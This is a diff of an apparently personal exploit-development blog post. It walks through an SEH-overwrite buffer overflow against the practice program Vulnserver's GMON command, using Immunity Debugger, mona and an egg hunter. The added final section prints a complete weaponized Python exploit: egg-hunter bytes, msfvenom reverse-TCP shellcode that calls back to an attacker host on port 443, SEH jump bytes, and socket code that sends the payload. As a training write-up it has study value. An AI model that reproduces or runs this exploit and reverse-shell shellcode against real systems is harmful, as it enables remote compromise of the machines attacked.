@@ -56,6 +56,8 @@ The application, which is attached to [Immunity Debugger](https://www.immunityin
 Knowing that EIP is not overwritten, this throws us for a loop. Remember, that these registers are all apart of the stack. What else do we recall is on the stack? That is right, exception handlers. Immunity (and OllyDBG) allow you to view the SEH chain to see what is occuring. To access this chain, click `View > SEH Chain`. Well, what do you know?! Our user supplied data hit nSEH and SEH and they were corrupted with 41's, or A's.
 <img src="{{ site.url }}{{ site.baseurl }}/images/SEH.png" alt="">
 
+Calculating The Offset
+---
 Just like a vanilla EIP overwrite stack based buffer overflow- we need to find the offset to a particular place in memory where we can control the flow of execution. But without EIP- what can we do? We actually are going to leverage the SEH chain to write to EIP. Bear with me here. Firstly, before we do anything- we need to find the offset to nSEH. Since the SEH chain is a linked list, SEH will reside right next to nSEH. To find the offset of nSEH, we are going to create a 5000 byte string cyclic pattern, that will help us determine where nSEH is. Here is the command to generate this in Metasploit:
 ```console 
 root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
@@ -113,6 +115,8 @@ Again, we execute the script after restarting the application in Immunity. The c
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/SEH1.png" alt="">
 
+The Importance of Pop Pop Ret
+---
 Awesome! We can control what gets stored in the SEH chain. You may be asking yourself "How are we going to leverage this information?" Remember when I talked about the location of SEH after an exception occurs? The value is `esp+8`. This is where that comes in handy. Let's take a step back and remember how assembler commands work for a second. A `pop` instruction will generally remove a register off of the stack. The stack (for our purposes here) grows downwards in memory addresses. When a `pop` instruction is executed, the value of the current stack pointer (ESP) INCREASES by 4 bytes. A `ret`, or return, instruction will load the current value of the stack pointer into the instruction pointer (EIP). If we fill SEH with a `pop <register> pop <register> ret` instruction we can move our current stack pointer (ESP) 8 bytes upward in memory (4 bytes for each `pop` instruction). If SEH is located at the current ESP value plus 8 bytes, a `pop pop` sequence will take our current stack pointer and fill it with SEH's value (which is `esp+8`) into the stack pointer (ESP). The last `ret` instruction, as explained above, will take our ESP value, which now contains our SEH value, and place it into EIP- allowing for redirection of execution! We do not care which registers are getting popped off of the stack- just as long as they get popped off of the stack. We don't mind the registers getting popped off- we only care that ESP increases when a `pop` insruction is executed. Mona has a nice feature to search for `pop pop ret` sequences. Here is the command used in Immunity: `!mona seh`(Again, I know it is hard to see, so i zoomed in on the addresses in the second image):
 <img src="{{ site.url }}{{ site.baseurl }}/images/poppopret.png" alt="">
 
@@ -156,6 +160,8 @@ Notice where we are!!!! Look at the 3 values below our current instruction! You 
 The address `00C0FFDC` is the "Pointer to next SEH record", which is nSEH. That address, as shown in image after we stepped thorugh the `pop pop ret` instructions, is the address of where our B's (42 hex) start. Awesome! Now what could we do from here? We could do a typical jump to ESP to execute shellcode! But we have a slight issue. ESP only has the capability to hold less than 30 bytes:
 <img src="{{ site.url }}{{ site.baseurl }}/images/ugh.png" alt="">
 
+Take the Jump!
+---
 This minute amount of space is not even enough for our egg hunter to go, much less shellcode for a shell! What can we do? Well one thing we are going to have to do is some math! But we can make a jump backwards into our "A" (41 hex) buffer and store our egg hunter there. As you may or may not know, there are no actual negative numbers in hex. We can however use something known as the two's compliment to obtain a hex value that we can push onto the stack to make a jump backwards. We need 32 bytes for our egg hunter, so let's jump 40 bytes backwards. I am not going to get into the low level math of the two's compliment (although it is not too difficult, and that is coming from someone who is subpar on a good day in arithmetic). Here is a [Two's Compliment Calculator](https://www.exploringbinary.com/twos-complement-converter/). The two's compliment is just a way to represent a negative number in hex. The two's compliment of 40 in binary is `1101 1000`. Converting this value to hex gives us `D8`. The opcode for a short jump is `EB`. We can use an instruction of `EB D8` to jump us back 40 bytes, in order to store our egg hunter! Let's update our PoC to reflect this and validate (Remember that we are filling nSEH with the our jump instruction):
 ```console
 #!/usr/bin/python
@@ -185,6 +191,8 @@ We restart the application in Immunity, we throw our script at it. Application c
 We step though the jump withh `F7` and we land back in our A's:
 <img src="{{ site.url }}{{ site.baseurl }}/images/validate.png" alt="">
 
+Let's Go Huntin', Boys!
+ ---
 Now it is time to generate our egg hunter. We will do this with mona. This is the command I issued:
 `!mona egg -t w00t`:
 <img src="{{ site.url }}{{ site.baseurl }}/images/eggsy.png" alt="">
@@ -200,7 +208,7 @@ import os
 #Vulnerable command
 command = "GMON /.:/"
 
-#Egg hunta 32 bytes
+#Egg hunta = w00t 32 bytes
 egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
 "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
 
@@ -222,3 +230,65 @@ Some questions you may have are probably: "Why did your initial A value go from 
 
 We then restart our application in Immunity, and chuck our exploit at the application. Business as usual- application crashes, open the SEH chain, put a breakpoint on SEH. `Shift + F9` to pass our exception to the program, step through our `pop pop ret` instruction. We land at our jump. Step through the jump and voila! We have landed on our egg hunter:
 <img src="{{ site.url }}{{ site.baseurl }}/images/voila.png" alt="">
+
+Country Roads, Take Me Home
+---
+We now update our PoC into a weaponzied exploit. This exploit will return a shell over TCP port 443 to our machine. Here is what the exploit looks like, and I will explain what is happening:
+```console
+root@kali:~/Desktop# cat EXPLOIT.py 
+import socket
+import sys
+import os
+
+#Vulnerable command
+command = "GMON /.:/"
+
+#Egg hunta = w00t 32 bytes
+egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
+
+#Shellcode generation = msfvenom -p windows/shell_reverse_tcp LHOST=172.16.55.69 LPORT=443 EXITFUNC=thread -b "\x00" -f c
+shellcode=("\xb8\xcb\x5d\xb0\x5d\xdb\xd0\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
+"\x52\x31\x43\x12\x83\xc3\x04\x03\x88\x53\x52\xa8\xf2\x84\x10"
+"\x53\x0a\x55\x75\xdd\xef\x64\xb5\xb9\x64\xd6\x05\xc9\x28\xdb"
+"\xee\x9f\xd8\x68\x82\x37\xef\xd9\x29\x6e\xde\xda\x02\x52\x41"
+"\x59\x59\x87\xa1\x60\x92\xda\xa0\xa5\xcf\x17\xf0\x7e\x9b\x8a"
+"\xe4\x0b\xd1\x16\x8f\x40\xf7\x1e\x6c\x10\xf6\x0f\x23\x2a\xa1"
+"\x8f\xc2\xff\xd9\x99\xdc\x1c\xe7\x50\x57\xd6\x93\x62\xb1\x26"
+"\x5b\xc8\xfc\x86\xae\x10\x39\x20\x51\x67\x33\x52\xec\x70\x80"
+"\x28\x2a\xf4\x12\x8a\xb9\xae\xfe\x2a\x6d\x28\x75\x20\xda\x3e"
+"\xd1\x25\xdd\x93\x6a\x51\x56\x12\xbc\xd3\x2c\x31\x18\xbf\xf7"
+"\x58\x39\x65\x59\x64\x59\xc6\x06\xc0\x12\xeb\x53\x79\x79\x64"
+"\x97\xb0\x81\x74\xbf\xc3\xf2\x46\x60\x78\x9c\xea\xe9\xa6\x5b"
+"\x0c\xc0\x1f\xf3\xf3\xeb\x5f\xda\x37\xbf\x0f\x74\x91\xc0\xdb"
+"\x84\x1e\x15\x4b\xd4\xb0\xc6\x2c\x84\x70\xb7\xc4\xce\x7e\xe8"
+"\xf5\xf1\x54\x81\x9c\x08\x3f\x02\x70\x25\xfa\x32\x73\x49\x05"
+"\x78\xfa\xaf\x6f\x6e\xab\x78\x18\x17\xf6\xf2\xb9\xd8\x2c\x7f"
+"\xf9\x53\xc3\x80\xb4\x93\xae\x92\x21\x54\xe5\xc8\xe4\x6b\xd3"
+"\x64\x6a\xf9\xb8\x74\xe5\xe2\x16\x23\xa2\xd5\x6e\xa1\x5e\x4f"
+"\xd9\xd7\xa2\x09\x22\x53\x79\xea\xad\x5a\x0c\x56\x8a\x4c\xc8"
+"\x57\x96\x38\x84\x01\x40\x96\x62\xf8\x22\x40\x3d\x57\xed\x04"
+"\xb8\x9b\x2e\x52\xc5\xf1\xd8\xba\x74\xac\x9c\xc5\xb9\x38\x29"
+"\xbe\xa7\xd8\xd6\x15\x6c\xf8\x34\xbf\x99\x91\xe0\x2a\x20\xfc"
+"\x12\x81\x67\xf9\x90\x23\x18\xfe\x89\x46\x1d\xba\x0d\xbb\x6f"
+"\xd3\xfb\xbb\xdc\xd4\x29")
+
+pwn = "w00tw00t"
+pwn+= shellcode
+pwn+= "A" * (3457-len(pwn))
+pwn+= egghunter
+pwn+= "\x90\x90\x90\x90\x90\x90"
+pwn+= "\xeb\xd8\x90\x90"
+pwn+= "\xb3\x11\x50\x62"
+pwn+= "D" * (5000-len(pwn))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.134", 9999))
+
+s.send(command+pwn)
+s.recv(1024)
+s.close()
+```
+Remember when we spoke about egg hunters earlier? Two things were mentioned. 1- The egg hunter looks for two occurences of it's tag in order to execute. This is why we have `w00tw00t` in our second stage shellcode, even though our tag generated on the egg hunter was just `w00t`. We also said that we append our tag onto the front of our shellcode, which is what is going on here. Everything else stays the same- and we are ready to fire off our exploit! We will still use Immunity until we can guarentee 100 percent that our exploit works.
+
+We restart the application in Immunity. We drop kick our exploit like freaking Tim Howard at Vulnserver. The application crashes. Nothing new here- we just open the SEH chain in Immunity. We set a breakpoint on SEH. We then pass the exception onto the application with a `Shift + F9` command. We step through our `pop eax, pop eax, ret` instruction to reach our short jump backwards. We step through that instruction and again land on our egg hunter.
